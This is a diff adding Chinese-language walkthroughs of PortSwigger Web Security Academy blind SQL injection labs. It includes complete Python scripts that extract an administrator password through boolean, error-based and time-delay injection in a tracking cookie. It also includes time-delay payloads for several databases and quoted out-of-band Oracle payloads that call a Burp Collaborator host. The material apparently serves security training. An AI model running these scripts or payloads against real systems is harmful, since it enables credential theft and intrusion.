@@ -128,3 +128,217 @@ Oracle数据库的结构不一样。
 
 #### 9. Blind SQL injection with conditional responses
 
+> The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+>
+> The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
+>
+> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+
+题目提示说是在cookie里面存在sql盲注，而且表名和列名都给了。
+
+经过测试，这里是cookie里的TrackingId进行sql查询，查询成功返回`Welcome back!`，查询失败啥也没有。
+
+POC:
+
+`TrackingId=n4Ytob3xdbmjJsyb' and '1'='1` 有welcome
+
+`TrackingId=n4Ytob3xdbmjJsyb' and '1'='2` 没有
+
+直接用原来写过的sql-bool盲注脚本，改改还能用。
+
+```python
+import requests
+
+
+def guess_number(url, cookie_name, cookie, temp_cookie, num_guess_payload, find_in_text):
+    start = 0  # use for length's start
+    end = 100  # use for length's end
+    while True:
+        payload = temp_cookie + num_guess_payload.format((start + end) // 2)
+        cookie[cookie_name] = payload
+        (start, end) = change_start_end(url, cookie, find_in_text, start, end)
+        if start == end:
+            print("number={}".format(start))
+            break
+    return start
+
+
+def guess_name(url, num_guess_payload, name_guess_payload, find_in_text, cookie_name, cookie):
+    temp_cookie = cookie[cookie_name]
+    length = guess_number(url, cookie_name, cookie, temp_cookie, num_guess_payload, find_in_text)
+    s = ""
+    for i in range(1, length + 1):
+        start = 32  # use for ascii's start
+        end = 126  # use for ascii's end
+        while True:
+            payload = temp_cookie + name_guess_payload.format(i, (start + end) // 2)
+            cookie[cookie_name] = payload
+            (start, end) = change_start_end(url, cookie, find_in_text, start, end)
+            if start == end:
+                s += chr(start)
+                break
+        print(i, s)
+
+
+def change_start_end(url, cookie, find_in_text, start, end):
+    r = requests.get(url, cookies=cookie)
+    if find_in_text not in r.text:
+        end = (start + end) // 2
+    else:
+        start = (start + end) // 2 + 1
+    return start, end
+
+
+if __name__ == "__main__":
+    Url = "https://ac721f9d1f7fd2b180ae239000bf0082.web-security-academy.net/filter?category=Accessories"
+    Cookie_name = "TrackingId"
+    Cookie = {"TrackingId": "ydzubFpeg82eKVTu'", "session": "5fLeIaPZHLmntwNzd2ddTS2b6Jf5XcI3"}
+    Find_in_text = "Welcome back!"
+    Num_guess_payload = ''' and (select length(password) from users where username='administrator')>{}--'''
+    Name_guess_payload = ''' and (select ascii(substr(password,{},1)) from users where username='administrator')>{}--'''
+    guess_name(Url, Num_guess_payload, Name_guess_payload, Find_in_text, Cookie_name, Cookie)
+```
+
+#### 10. Blind SQL injection with conditional errors
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+>
+> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+>
+> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+>
+> To solve the lab, log in as the `administrator` user.
+>
+> This lab uses an Oracle database.
+
+这个用的是Oracle数据库。
+
+> 从sheet里面可以看到：
+>
+> ```sql
+> SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
+> ```
+
+这个表达式：
+
+* 如果condition为真，则执行第一个表达式：to_char(1/0)，然而这个表达式有除零错误（这里不用to_char也是可以的），所以返回状态码500表示服务器端错误。
+* 如果condition为假，则执行第二个表达式：NULL，这个表达式没有错误。
+
+于是将上一题的代码的main函数改成这样即可直接跑出来：
+
+```python
+if __name__ == "__main__":
+    Url = "https://ac301f8d1e4ef79b8055332b00af0046.web-security-academy.net/filter?category=Accessories"
+    Cookie_name = "TrackingId"
+    Cookie = {"TrackingId": "JQcNHbTPXq9UxrU2'", "session": "PY8nWTd22KvgnKZQ4F024YwRqRcCgnCA"}
+    Find_in_text = "Internal Server Error"
+    Num_guess_payload = '''||(SELECT CASE WHEN (length(password)>{}) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator')--'''
+    Name_guess_payload = '''||(SELECT CASE WHEN (ascii(substr(password,{},1))>{}) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator')--'''
+    guess_name(Url, Num_guess_payload, Name_guess_payload, Find_in_text, Cookie_name, Cookie)
+```
+
+#### 11. Blind SQL injection with time delays
+
+> The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+>
+> To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.
+
+注入点在cookie处，这里只要造成十秒以上的延时就可以了。
+
+| 数据库     | 代码                                  |
+| :--------- | ------------------------------------- |
+| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
+| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
+| PostgreSQL | `SELECT pg_sleep(10)`                 |
+| MySQL      | `SELECT sleep(10)`                    |
+
+挨个挨个试就好了。
+
+POC：`TrackingId=jbNcnwblXe2NChRZ'||pg_sleep(10)--;`
+
+#### 12. Blind SQL injection with time delays and information retrieval
+
+> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+>
+> To solve the lab, log in as the `administrator` user.
+
+这是一个延时盲注，注入点在cookie那里。
+
+先测试是哪一种数据库，测试出来是：**PostgreSQL**
+
+`TrackingId=JuRFGgqubxoCt6AU'||pg_sleep(10)--`
+
+接着进行时间盲注。
+
+sheet给的：
+
+`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
+
+脚本：
+
+```python
+import requests
+import time
+
+
+def guess_number(url, cookie_name, cookie, temp_cookie, num_guess_payload, inter_time):
+    start = 0  # use for length's start
+    end = 100  # use for length's end
+    while True:
+        payload = temp_cookie + num_guess_payload.format((start + end) // 2)
+        cookie[cookie_name] = payload
+        (start, end) = change_start_end(url, cookie, inter_time, start, end)
+        if start == end:
+            print("number={}".format(start))
+            break
+    return start
+
+
+def guess_name(url, num_guess_payload, name_guess_payload, inter_time, cookie_name, cookie):
+    temp_cookie = cookie[cookie_name]
+    length = guess_number(url, cookie_name, cookie, temp_cookie, num_guess_payload, inter_time)
+    s = ""
+    for i in range(1, length + 1):
+        start = 32  # use for ascii's start
+        end = 126  # use for ascii's end
+        while True:
+            payload = temp_cookie + name_guess_payload.format(i, (start + end) // 2)
+            cookie[cookie_name] = payload
+            (start, end) = change_start_end(url, cookie, inter_time, start, end)
+            if start == end:
+                s += chr(start)
+                break
+        print(i, s)
+
+
+def change_start_end(url, cookie, inter_time, start, end):
+    time_start = time.time()
+    requests.get(url, cookies=cookie)
+    time_end = time.time()
+    if time_end - time_start < inter_time:
+        end = (start + end) // 2
+    else:
+        start = (start + end) // 2 + 1
+    return start, end
+
+
+if __name__ == "__main__":
+    Url = "https://ac5b1f941e51433980e52e3400740020.web-security-academy.net/filter?category=Accessories"
+    Cookie_name = "TrackingId"
+    Cookie = {"TrackingId": "JuRFGgqubxoCt6AU'", "session": "nlFy5SWHU51psuWucd1ZpXTYtd594zqk"}
+    Inter_time = 10
+    Num_guess_payload = '''||(SELECT CASE WHEN (length(password)>{}) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator')--'''
+    Name_guess_payload = '''||(SELECT CASE WHEN (ascii(substr(password,{},1))>{}) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator')--'''
+    guess_name(Url, Num_guess_payload, Name_guess_payload, Inter_time, Cookie_name, Cookie)
+
+```
+
+由于这个burp的网站普遍反映较慢，所以我把间隔时间调的特别长（10秒）来保证足够的精确性，相应的，时间就会需要特别久。
+
+#### 13. Blind SQL injection with out-of-band interaction
+
+> The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+> `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`
+>
+> The following technique works on fully patched Oracle installations, but requires elevated privileges:
+> `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')`
